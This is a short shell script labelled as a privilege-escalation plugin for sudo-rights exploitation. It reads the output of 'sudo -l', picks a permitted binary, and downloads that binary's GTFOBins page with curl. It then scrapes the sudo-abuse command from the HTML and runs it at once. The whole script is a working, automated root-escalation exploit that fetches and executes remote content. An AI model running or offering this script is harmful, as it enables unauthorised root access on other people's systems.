# [PLUGIN PRIVESC] Sudo rights exploitation

res=$(sudo -l)
bin=$(echo $res | rev | cut -d'/' -f 1 | rev)
bin=${bin//$'\n'/}
url="https://gtfobins.github.io/gtfobins/${bin}/#sudo"
code=$(curl $url)
cmd=$(echo $code | awk -F'<pre><code>sudo' '{print $2}')
cmd=${cmd//$'\n'/}
cmd=$(echo $cmd | awk -F'</code></pre>' '{print $1}')
$cmd
